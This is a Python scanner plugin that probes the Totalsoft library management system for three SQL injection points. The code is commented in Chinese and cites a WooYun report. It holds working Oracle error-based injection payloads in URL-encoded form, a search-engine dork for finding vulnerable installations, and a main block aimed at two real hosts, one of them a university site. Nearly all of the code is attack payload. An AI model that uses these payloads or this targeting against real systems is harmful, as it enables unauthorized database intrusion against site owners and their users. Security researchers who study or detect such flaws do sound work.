#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 图腾软件图书管理系统三处SQL注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0135252
description:
    Code.aspx?id=0143034244
    Periodical.aspx?ID=1113000371
    SearchJournalByChar.aspx?QU=0
google dork:
    版权所有© 重庆图腾软件发展有限公司 
'''

def assign(service, arg):
    if service == 'totalsoft_lib':
        return True, arg

def audit(arg):
    urls = [
        arg + 'Code.aspx?id=0143034244%27%20and%20233=(select%20upper(XMLType(chr(60)||chr(58)||CHR(87)||CHR(84)||CHR(70)||CHR(65)||CHR(66)||CHR(67)))%20from%20dual)%20and%20%27wtf%27=%27wtf',
        arg + 'Periodical.aspx?ID=1113000371%27%20and%20233=(select%20upper(XMLType(chr(60)||chr(58)||CHR(87)||CHR(84)||CHR(70)||CHR(65)||CHR(66)||CHR(67)))%20from%20dual)%20and%20%27wtf%27=%27wtf',
        arg + 'SearchJournalByChar.aspx?QU=0%27%20and%20233=(select%20upper(XMLType(chr(60)||chr(58)||CHR(87)||CHR(84)||CHR(70)||CHR(65)||CHR(66)||CHR(67)))%20from%20dual)%20and%20%27wtf%27=%27wtf',
        ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url)
        if (code != 0) and ('WTFABC' in res):
            security_hole('SQL Injection: ' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('totalsoft_lib', 'http://124.160.90.204/')[1])
    audit(assign('totalsoft_lib', 'http://www.paisi.edu.cn:85/')[1])
